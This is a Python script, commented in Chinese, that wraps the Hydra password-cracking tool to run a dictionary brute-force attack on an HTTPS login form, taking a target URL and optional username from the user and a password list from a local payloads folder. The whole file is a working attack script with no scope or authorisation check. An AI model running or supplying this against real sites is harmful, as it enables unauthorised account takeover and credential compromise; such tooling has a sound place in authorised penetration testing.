import subprocess
import os

file_path = os.path.dirname(os.path.abspath(__file__))  # 使用 __file__ 獲取當前腳本路徑
real_path = os.path.join(file_path, "..", "..", "payloads", "passwords.txt")

def run_hydra(target_url, username, password_list):
    # 構建 hydra 命令
    command = [
        'hydra',
        '-P', password_list,
        '-s', '443',  # 使用 HTTPS 默認端口
        target_url,
        'http-form-post',
        'password=^PASS^:F=incorrect'  # 根據實際情況調整表單字段
    ]

    # 如果提供了用戶名，則將其添加到命令中
    if username:
        command.insert(2, '-l')
        command.insert(3, username)

    # 執行命令
    try:
        result = subprocess.run(command, capture_output=True, text=True)
        print("Hydra Output:")
        print(result.stdout)
        if result.returncode != 0:
            print("Error:", result.stderr)
    except FileNotFoundError:
        print("Hydra command not found. Please ensure Hydra is installed and in your PATH.")
    except Exception as e:
        print("An error occurred:", str(e))

# 用法示例
if __name__ == "__main__":
    target_url = input("Enter the target URL: ")  # 目標 URL
    username = input("Enter the username (leave blank if not needed): ")  # 用戶名
    password_list = real_path  # 密碼字典文件路徑

    if os.path.exists(password_list):
        run_hydra(target_url, username.strip() or None, password_list)  # 空字符串轉為 None
    else:
        print(f"Password list file not found at: {real_path}")
